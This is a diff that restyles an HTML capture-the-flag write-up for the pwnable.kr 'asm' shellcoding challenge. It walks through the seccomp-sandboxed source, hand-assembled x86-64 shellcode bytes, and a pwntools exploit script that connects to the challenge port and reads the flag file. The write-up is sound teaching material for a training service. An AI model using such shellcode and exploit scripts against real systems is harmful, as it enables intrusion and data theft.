@@ -1,281 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <title>pwnable.kr - asm</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: asm - Yael Shechter</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
 
-    <!-- syntax highlighting (only affects code blocks we mark with language-*) -->
-    <link rel="stylesheet"
-          href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
-    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <script defer>
-        window.addEventListener("DOMContentLoaded", () => {
-            document.querySelectorAll("pre code.language-c, pre code.language-python")
-                .forEach((el) => window.hljs && hljs.highlightElement(el));
-        });
-    </script>
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
 
     <style>
-        :root {
-            --bg: #f7f5ff;
-            --card: #ffffff;
-            --accent: #8b6cff;
-            --accent-soft: #e0d8ff;
-            --text-main: #1f1f2e;
-            --text-muted: #6b6b80;
-            --border-soft: #e6e2ff;
-            --shadow-soft: 0 14px 40px rgba(34, 26, 79, 0.12);
-            --radius: 18px;
-            --code-bg: #111827;
-            --code-border: #374151;
-        }
-
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            margin: 0;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
-            sans-serif;
-            background: radial-gradient(circle at top, #fdfbff 0, #f3f2ff 40%, #ebe9ff 100%);
-            color: var(--text-main);
+            font-family: 'DM Sans', sans-serif;
+            background: #fafafa;
+            color: #2d3748;
+            line-height: 1.7;
         }
 
-        .page {
+        .container {
             max-width: 800px;
             margin: 0 auto;
-            padding: 32px 18px 60px;
+            padding: 60px 24px;
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.96);
-            border-radius: var(--radius);
-            padding: 22px 22px 26px;
-            box-shadow: var(--shadow-soft);
-            border: 1px solid rgba(201, 189, 255, 0.5);
+        header {
+            margin-bottom: 64px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .back-link {
+            color: #4299e1;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+
+        .back-link:hover {
+            color: #2b6cb0;
+        }
+
+        .back-link::before {
+            content: '← ';
         }
 
         h1 {
-            margin: 0 0 8px;
-            font-size: 24px;
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a202c;
+            letter-spacing: -0.02em;
         }
 
-        h2 {
-            font-size: 18px;
-            margin: 18px 0 10px;
-        }
-
-        h3 {
-            font-size: 16px;
-            margin: 16px 0 8px;
-        }
-
-        .subtitle {
-            font-size: 14px;
-            color: var(--text-muted);
-            margin-bottom: 14px;
-        }
-
-        .tag-row {
+        .meta {
             display: flex;
+            gap: 16px;
             flex-wrap: wrap;
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+
+        .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tags {
+            display: flex;
             gap: 8px;
-            margin-bottom: 18px;
+            flex-wrap: wrap;
+            margin-top: 16px;
         }
 
         .tag {
-            font-size: 11px;
-            padding: 4px 10px;
-            border-radius: 999px;
-            background: var(--accent-soft);
-            color: #3e346b;
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            background: #edf2f7;
+            color: #4a5568;
+            font-family: 'Fira Code', monospace;
+        }
+
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+
+        article h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-top: 40px;
+            margin-bottom: 16px;
+        }
+
+        article h2:first-child {
+            margin-top: 0;
+        }
+
+        article h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 32px;
+            margin-bottom: 12px;
         }
 
         article p {
-            font-size: 14px;
+            font-size: 16px;
             line-height: 1.7;
-            color: var(--text-main);
-            margin: 0 0 10px;
+            margin-bottom: 16px;
+            color: #2d3748;
+        }
+
+        article ul, article ol {
+            margin-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        article li {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        article a {
+            color: #4299e1;
+            text-decoration: none;
+        }
+
+        article a:hover {
+            text-decoration: underline;
         }
 
         code {
-            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
-            "Liberation Mono", "Courier New", monospace;
-            font-size: 13px;
-            background: rgba(0, 0, 0, 0.04);
-            padding: 2px 4px;
-            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #2d3748;
         }
 
         pre {
-            margin: 10px 0 14px;
-            background: var(--code-bg);
-            color: #e5e7eb;
-            border-radius: 10px;
-            padding: 10px 12px;
+            background: #1a202c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
             overflow-x: auto;
-            border: 1px solid var(--code-border);
-            font-size: 13px;
-            line-height: 1.5;
+            border: 1px solid #2d3748;
         }
 
         pre code {
             background: none;
             padding: 0;
-        }
-
-        pre, pre code {
-            white-space: pre-wrap;
-            word-break: break-word;
-        }
-
-        ul {
-            padding-left: 18px;
-            margin: 6px 0 14px;
-        }
-
-        li {
+            color: #e2e8f0;
             font-size: 14px;
             line-height: 1.6;
-            color: var(--text-main);
-            margin-bottom: 4px;
         }
 
-        a {
-            color: var(--accent);
-            text-decoration: none;
+        .hljs {
+            background: transparent;
+            color: #e2e8f0;
         }
 
-        a:hover {
-            text-decoration: underline;
-        }
-
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            margin-bottom: 14px;
-            color: var(--text-muted);
-            text-decoration: none;
-        }
-
-        .back-link:hover {
-            color: var(--accent);
-            text-decoration: underline;
-        }
-
-        .back-link span {
-            font-size: 16px;
-            line-height: 1;
-        }
-
-        .header-image {
-            max-width: 240px;
-            max-height: 180px;   /* ← This keeps tall images small */
-            width: auto;
-            height: auto;
-            object-fit: contain;
-            margin: 8px auto 14px;
-            display: block;
-            border-radius: 12px;
-            box-shadow: 0 10px 24px rgba(15, 23, 42, 0.22);
+        hr {
+            border: none;
+            border-top: 1px solid #e2e8f0;
+            margin: 32px 0;
         }
 
         .meme-image {
             width: 100%;
             max-width: 460px;
             display: block;
-            margin: 14px auto 0;
-            border-radius: 12px;
-            box-shadow: 0 10px 24px rgba(15, 23, 42, 0.16);
+            margin: 24px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        hr {
-            border: none;
-            border-top: 1px solid var(--border-soft);
-            margin: 18px 0;
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            article {
+                padding: 24px;
+            }
+
+            pre {
+                padding: 16px;
+            }
         }
     </style>
 </head>
 <body>
-<div class="page">
-    <a href="index.html" class="back-link">
-        <span>←</span> back to writeups
-    </a>
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: asm</h1>
+        <div class="meta">
+            <span>📅 Nov 2025</span>
+            <span>🏆 6 points</span>
+            <span>📂 Toddler's Bottle</span>
+        </div>
+        <div class="tags">
+            <span class="tag">shellcode</span>
+            <span class="tag">seccomp</span>
+            <span class="tag">assembly</span>
+            <span class="tag">pwntools</span>
+        </div>
+    </header>
 
-    <div class="card">
-        <header>
-            <h1>asm</h1>
-            <div class="subtitle">
-            </div>
-            <div class="tag-row">
-                <div class="tag">Toddler's Bottle</div>
-                <div class="tag">Points: 6</div>
-                <div class="tag">Host: pwnable.kr</div>
-            </div>
-            <img src="images/meme.png" alt="asm meme" class="meme-image" />
-        </header>
+    <article>
+        <img src="images/meme.png" alt="asm meme" class="meme-image" />
 
-        <article>
+        <h2>Challenge Description</h2>
+        <p>Mommy! I think I know how to make shellcodes</p>
 
-            <hr />
+        <pre><code>ssh asm@pwnable.kr -p2222 (pw: guest)</code></pre>
 
-            <p>We get the following hint:</p>
+        <p>In the home folder there are these files:</p>
 
-            <pre><code>Mommy! I think I know how to make shellcode
+        <pre><code>$ ls -la
+total 44
+drwxr-x---   5 root asm     4096 Oct 23  2016 .
+drwxr-xr-x 116 root root    4096 Nov 12 21:34 ..
+d---------   2 root root    4096 Oct 23  2016 .bash_history
+-r--r-----   1 root asm_pwn   33 Oct 12  2016 flag
+-r-xr-sr-x   1 root asm_pwn 8704 Oct 12  2016 asm
+-rw-r--r--   1 root root     523 Oct 12  2016 asm.c
+-rw-r--r--   1 root root     211 Oct 12  2016 readme
+-rw-r--r--   1 root root       0 Oct 23  2016 .selected_editor
+drwxr-xr-x   2 root root    4096 Oct 23  2016 .pwntools-cache
+drwxrwxrwx   2 root root    4096 Jan 11 18:22 tmp</code></pre>
 
-ssh asm@pwnable.kr -p2222
-</code></pre>
+        <p>Checking the readme:</p>
 
-            <p>So first step is to connect:</p>
+        <pre><code>$ cat readme
+once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
+make connection to challenge (nc 0 9026) then get the flag.</code></pre>
 
-            <pre><code>ssh asm@pwnable.kr -p2222
-</code></pre>
+        <h2>Source Code Analysis</h2>
+        <p>Opening <code>asm.c</code>:</p>
 
-            <p>In <code>/home/asm</code> we see:</p>
-
-            <pre><code>asm
-asm.c
-readme
-this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
-</code></pre>
-
-            <p>The <code>readme</code> file explains how the challenge is supposed to be solved:</p>
-
-            <pre><code>once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
-make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
-</code></pre>
-
-            <p>Trying to cat the flag file directly only gives us:</p>
-
-            <pre><code>this is fake flag file for letting you know the name of flag file.
-</code></pre>
-
-            <p>So we have to connect to the binary running remotely.</p>
-
-            <p>Connecting with netcat <code>nc 0 9026</code> we get:</p>
-
-            <pre><code>Welcome to shellcoding practice challenge.
-In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
-Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
-If this does not challenge you. you should play 'asg' challenge :)
-</code></pre>
-
-            <p>
-                The goal is clear: the shellcode we provide must use only <code>open</code>,
-                <code>read</code> and <code>write</code> syscalls (plus <code>exit</code> /
-                <code>exit_group</code>, which are also allowed).
-            </p>
-
-            <h2>Source Code Analysis</h2>
-
-            <p>Let's inspect the source code in <code>asm.c</code>:</p>
-
-            <pre><code class="language-c">#include &lt;stdio.h&gt;
+        <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;sys/mman.h&gt;
@@ -308,9 +295,9 @@ void sandbox(){
 }
 
 char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
-
 unsigned char filter[256];
 int main(int argc, char* argv[]){
+
     setvbuf(stdout, 0, _IONBF, 0);
     setvbuf(stdin, 0, _IOLBF, 0);
 
@@ -328,50 +315,29 @@ int main(int argc, char* argv[]){
     read(0, sh+offset, 1000);
 
     alarm(10);
-    chroot("/home/asm_pwn");  // you are in chroot jail. so you can't use symlink in /tmp
+    chroot("/home/asm_pwn");
     sandbox();
     ((void (*)(void))sh)();
     return 0;
-}
-</></pre>
+}</code></pre>
 
-            <p>There is a stub that runs before our payload. Disassembling it gives:</p>
+        <p>The program:</p>
 
-            <pre><code>0:  48 31 c0                xor    rax,rax
-3:  48 31 db                xor    rbx,rbx
-6:  48 31 c9                xor    rcx,rcx
-9:  48 31 d2                xor    rdx,rdx
-c:  48 31 f6                xor    rsi,rsi
-f:  48 31 ff                xor    rdi,rdi
-12: 48 31 ed                xor    rbp,rbp
-15: 4d 31 c0                xor    r8,r8
-18: 4d 31 c9                xor    r9,r9
-1b: 4d 31 d2                xor    r10,r10
-1e: 4d 31 db                xor    r11,r11
-21: 4d 31 e4                xor    r12,r12
-24: 4d 31 ed                xor    r13,r13
-27: 4d 31 f6                xor    r14,r14
-2a: 4d 31 ff                xor    r15,r15
-</code></pre>
+        <ul>
+            <li>Allocates memory space on the heap using the <code>mmap</code> function, and setting the address to the <code>sh</code> variable.</li>
+            <li>Sets the first <code>0x1000</code> bytes of the allocated memory with the <code>nop</code> instruction (<code>0x90</code> opcode).</li>
+            <li>Copies the stub into the first bytes of the allocated memory.</li>
+            <li>Gets the input "shellcode" from the user, and copies it after the stub in the allocated memory.</li>
+            <li>Sets up a chroot jail, meaning that we can't use symlinks in <code>/tmp</code>.</li>
+            <li>Loads the sandbox that limits the syscalls we can execute (<code>open</code>, <code>read</code>, <code>write</code>). Any other syscall would kill the process.</li>
+            <li>Parses <code>sh</code> to a function and executes it.</li>
+        </ul>
 
-            <p>It looks like the shellcode clears all the registers before our payload runs.</p>
+        <h2>Attempting Manual Shellcode</h2>
 
-            <p>The main function:</p>
-            <ul>
-                <li>Allocates memory space on the heap using the <code>mmap</code> function, and setting the address to the <code>sh</code> variable.</li>
-                <li>Sets the first <code>0x1000</code> bytes of the allocated memory with the <code>nop</code> instruction (<code>0x90</code> opcode).</li>
-                <li>Copies the stub into the first bytes of the allocated memory.</li>
-                <li>Gets the input "shellcode" from the user, and copies it after the stub in the allocated memory.</li>
-                <li>Sets up a chroot jail, meaning that we can't use symlinks in <code>/tmp</code>.</li>
-                <li>Loads the sandbox that limits the syscalls we can execute (<code>open</code>, <code>read</code>, <code>write</code>). Any other syscall would kill the process.</li>
-                <li>Parses <code>sh</code> to a function and executes it.</li>
-            </ul>
+        <p>I started with a basic C program that opens the file and prints the content.</p>
 
-            <h2>Attempting Manual Shellcode</h2>
-
-            <p>I started with a basic C program that opens the file and prints the content.</p>
-
-            <pre><code class="language-c">#include &lt;stdlib.h&gt;
+        <pre><code class="language-c">#include &lt;stdlib.h&gt;
 #include &lt;fcntl.h&gt;
 #include &lt;unistd.h&gt;
 
@@ -381,20 +347,13 @@ int main(int argc, char* argv[]){
     read(fd, c, 100);
     write(1, c, 100);
     exit(0);
-}
-</code></pre>
+}</code></pre>
 
-            <p>
-                Compiled and run locally, this prints the dummy flag from the local file, so the
-                logic is fine. The only problem is that <code>calloc</code> is using syscalls that
-                are not allowed in this environment. As I don't think there is a way around using
-                syscalls other than the allowed ones, I decided to write the shellcode directly in
-                assembly.
-            </p>
+        <p>Compiled and run locally, this prints the dummy flag from the local file, so the logic is fine. The only problem is that <code>calloc</code> is using syscalls that are not allowed in this environment. As I don't think there is a way around using syscalls other than the allowed ones, I decided to write the shellcode directly in assembly.</p>
 
-            <p>I wrote this small assembly file that reads from stdin and echoes to stdout:</p>
+        <p>I wrote this small assembly file that reads from stdin and echoes to stdout:</p>
 
-            <pre><code>.bss
+        <pre><code>.bss
 buf:
         .skip 100
 
@@ -416,21 +375,17 @@ _start:
 
         mov rax, 60
         xor rdi, rdi
-        syscall
-</code></pre>
+        syscall</code></pre>
 
-            <p>Steps:</p>
-            <ol>
-                <li>
-                    Assemble and link:
-                    <code>gcc -nostdlib -static asm-shell.s -o asm-shell</code>.<br />
-                    The <code>-nostdlib</code> flag avoids linking the C runtime and other automatic
-                    startup code. This keeps the binary clean from unnecessary code, making it
-                    easier to extract just the shellcode we wrote.
-                </li>
-                <li>
-                    Run <code>objdump -M intel -d asm-shell</code>:
-                    <pre><code>asm-shell:     file format elf64-x86-64
+        <p>Steps:</p>
+        <ol>
+            <li>
+                Assemble and link: <code>gcc -nostdlib -static asm-shell.s -o asm-shell</code>.<br />
+                The <code>-nostdlib</code> flag avoids linking the C runtime and other automatic startup code. This keeps the binary clean from unnecessary code, making it easier to extract just the shellcode we wrote.
+            </li>
+            <li>
+                Run <code>objdump -M intel -d asm-shell</code>:
+                <pre><code>asm-shell:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000401000 &lt;_start&gt;:
@@ -446,60 +401,39 @@ Disassembly of section .text:
   401036:       0f 05                   syscall
   401038:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
   40103f:       48 31 ff                xor    rdi,rdi
-  401042:       0f 05                   syscall
-</code></pre>
-                </li>
-                <li>
-                    Dump <code>.text</code> section into a file called <code>shell</code>:
-                    <pre><code>objcopy --dump-section .text=shell asm-shell
-</code></pre>
-                </li>
-                <li>
-                    Convert to shellcode bytes:
-                    <code>xxd -p shell | sed 's/../\\x&amp;/g; s/$/\\n/'</code> and got:
-                    <pre><code>\x48\xc7\xc0\x00\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x48\x8d\x35\xeb\x0f\x00\x00\x48\xc7\xc2\x64\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xc2\x48\xc7\xc0\x01\x00\x00\x00\x48\x8d\x35\xca\x0f\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05
-</code></pre>
-                </li>
-                <li>Passing the result to <code>~/asm</code> results in a segmentation fault.</li>
-                <li>Piping it into the program ran without an error, but as expected it did not print anything useful.</li>
-            </ol>
+  401042:       0f 05                   syscall</code></pre>
+            </li>
+            <li>
+                Dump <code>.text</code> section into a file called <code>shell</code>:
+                <pre><code>objcopy --dump-section .text=shell asm-shell</code></pre>
+            </li>
+            <li>
+                Convert to shellcode bytes: <code>xxd -p shell | sed 's/../\\x&amp;/g; s/$/\\n/'</code> and got:
+                <pre><code>\x48\xc7\xc0\x00\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x48\x8d\x35\xeb\x0f\x00\x00\x48\xc7\xc2\x64\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xc2\x48\xc7\xc0\x01\x00\x00\x00\x48\x8d\x35\xca\x0f\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05</code></pre>
+            </li>
+            <li>Passing the result to <code>~/asm</code> results in a segmentation fault.</li>
+            <li>Piping it into the program ran without an error, but as expected it did not print anything useful.</li>
+        </ol>
 
-            <p>
-                I tried to extend the assembly to actually call <code>open</code> on the long
-                filename, but this became very annoying:
-            </p>
+        <p>I tried to extend the assembly to actually call <code>open</code> on the long filename, but this became very annoying:</p>
 
-            <ul>
-                <li>In shellcode there is no <code>.data</code> section for the filename, so I couldn't just set it as a "variable".</li>
-                <li>I would have to save the very long name onto the stack manually.</li>
-                <li>I cannot use a shorter alias using a symlink, since the program puts a <code>chroot</code> jail on <code>/tmp</code>.</li>
-            </ul>
+        <ul>
+            <li>In shellcode there is no <code>.data</code> section for the filename, so I couldn't just set it as a "variable".</li>
+            <li>I would have to save the very long name onto the stack manually.</li>
+            <li>I cannot use a shorter alias using a symlink, since the program puts a <code>chroot</code> jail on <code>/tmp</code>.</li>
+        </ul>
 
-            <p>
-                At this point I decided that enough was enough. Although writing shellcode manually
-                was a good learning experience, handling this specific case would be unnecessarily
-                time-consuming. Switching to an automated tool like Pwntools made more sense here,
-                and is also useful for future challenges. The Pwntools <code>Shellcraft</code>
-                class could handle the long filename, and allow me write directly to the stack
-                without using unsupported syscalls.
-            </p>
+        <p>At this point I decided that enough was enough. Although writing shellcode manually was a good learning experience, handling this specific case would be unnecessarily time-consuming. Switching to an automated tool like Pwntools made more sense here, and is also useful for future challenges. The Pwntools <code>Shellcraft</code> class could handle the long filename, and allow me write directly to the stack without using unsupported syscalls.</p>
 
-            <h2>Solution with Pwntools Shellcraft</h2>
+        <h2>Solution with Pwntools Shellcraft</h2>
 
-            <p>
-                After all the effort hand-crafting x86-64 shellcode I decided to try using the
-                pwntools library for creating shellcode:
-                <a href="https://docs.pwntools.com/en/stable/shellcraft.html" target="_blank" rel="noreferrer">shellcraft</a>.
-            </p>
+        <p>After all the effort hand-crafting x86-64 shellcode I decided to try using the pwntools library for creating shellcode: <a href="https://docs.pwntools.com/en/stable/shellcraft.html" target="_blank" rel="noreferrer">shellcraft</a>.</p>
 
-            <p>This turned out to be so much easier for generating shellcode.</p>
+        <p>This turned out to be so much easier for generating shellcode.</p>
 
-            <p>
-                Here is the exploit script, which generates the shellcode, connects to the remote
-                running process and passes the shellcode:
-            </p>
+        <p>Here is the exploit script, which generates the shellcode, connects to the remote running process and passes the shellcode:</p>
 
-            <pre><code class="language-python">from pwn import *
+        <pre><code class="language-python">from pwn import *
 
 context.arch = 'x86_64'
 
@@ -517,68 +451,62 @@ print(lines.decode())
 t.sendline(asm(shellcode))
 
 lines = t.recv()
-print(lines.decode())
-</code></pre>
+print(lines.decode())</code></pre>
 
-            <p>Running <code>python3 shell.py</code> we get:</p>
+        <p>Running <code>python3 shell.py</code> we get:</p>
 
-            <pre><code>[+] Opening connection to localhost on port 9026: Done
+        <pre><code>[+] Opening connection to localhost on port 9026: Done
 Welcome to shellcoding practice challenge.
 In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
 Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
 If this does not challenge you. you should play 'asg' challenge :)
 give me your x64 shellcode:
 Mak1ng_5helLcodE_i5_veRy_eaSy
-[*] Closed connection to localhost port 9026
-</code></pre>
+[*] Closed connection to localhost port 9026</code></pre>
 
-            <p>Woohoo! mission accomplished.</p>
+        <p>Woohoo! mission accomplished.</p>
 
-            <h3>Script Breakdown</h3>
+        <h3>Script Breakdown</h3>
 
-            <p>Let's go over the code crafting the shellcode:</p>
+        <p>Let's go over the code crafting the shellcode:</p>
 
-            <ul>
-                <li>
-                    <code>shellcraft.open(filename, 0, 0)</code><br />
-                    <ul>
-                        <li><code>filename</code> is the long flag file name, relative to the current working directory.</li>
-                        <li><code>flags = 0</code> means <code>O_RDONLY</code>.</li>
-                        <li><code>mode</code> is ignored because we are not creating a file.</li>
-                    </ul>
-                    The file descriptor is returned in <code>rax</code>.
-                </li>
-                <li>
-                    <code>shellcraft.read('rax', 'rsp', 50)</code><br />
-                    <ul>
-                        <li><code>fd = rax</code>, because the file descriptor of the newly opened file is in <code>rax</code>.</li>
-                        <li><code>buf = rsp</code>, so we use the current stack as our buffer.</li>
-                        <li><code>size = 50</code>, which is enough to read the flag.</li>
-                    </ul>
-                </li>
-                <li>
-                    <code>shellcraft.write(1, 'rsp', 50)</code><br />
-                    <ul>
-                        <li><code>fd = 1</code> is stdout.</li>
-                        <li><code>buf = rsp</code> because this is where the content we just read is stored.</li>
-                        <li><code>size = 50</code> to match the read size, so we print exactly what we read.</li>
-                    </ul>
-                </li>
-            </ul>
+        <ul>
+            <li>
+                <code>shellcraft.open(filename, 0, 0)</code><br />
+                <ul>
+                    <li><code>filename</code> is the long flag file name, relative to the current working directory.</li>
+                    <li><code>flags = 0</code> means <code>O_RDONLY</code>.</li>
+                    <li><code>mode</code> is ignored because we are not creating a file.</li>
+                </ul>
+                The file descriptor is returned in <code>rax</code>.
+            </li>
+            <li>
+                <code>shellcraft.read('rax', 'rsp', 50)</code><br />
+                <ul>
+                    <li><code>fd = rax</code>, because the file descriptor of the newly opened file is in <code>rax</code>.</li>
+                    <li><code>buf = rsp</code>, so we use the current stack as our buffer.</li>
+                    <li><code>size = 50</code>, which is enough to read the flag.</li>
+                </ul>
+            </li>
+            <li>
+                <code>shellcraft.write(1, 'rsp', 50)</code><br />
+                <ul>
+                    <li><code>fd = 1</code> is stdout.</li>
+                    <li><code>buf = rsp</code> because this is where the content we just read is stored.</li>
+                    <li><code>size = 50</code> to match the read size, so we print exactly what we read.</li>
+                </ul>
+            </li>
+        </ul>
 
-            <p>
-                <code>asm(shellcode)</code> converts the assembly string into actual machine code
-                bytes, which we send as our payload.
-            </p>
+        <p><code>asm(shellcode)</code> converts the assembly string into actual machine code bytes, which we send as our payload.</p>
 
-            <h2>References</h2>
+        <h2>References</h2>
 
-            <ul>
-                <li>A shellcode database: <a href="https://shell-storm.org/shellcode/index.html" target="_blank" rel="noreferrer">https://shell-storm.org/shellcode/index.html</a></li>
-                <li>Nice Introduction to shellcode: <a href="https://www.youtube.com/watch?v=715v_-YnpT8" target="_blank" rel="noreferrer">https://www.youtube.com/watch?v=715v_-YnpT8</a></li>
-            </ul>
-        </article>
-    </div>
+        <ul>
+            <li>A shellcode database: <a href="https://shell-storm.org/shellcode/index.html" target="_blank" rel="noreferrer">https://shell-storm.org/shellcode/index.html</a></li>
+            <li>Nice Introduction to x64 Assembly: <a href="https://www.cs.uaf.edu/2017/fall/cs301/reference/x86_64.html" target="_blank" rel="noreferrer">https://www.cs.uaf.edu/2017/fall/cs301/reference/x86_64.html</a></li>
+        </ul>
+    </article>
 </div>
 </body>
 </html>
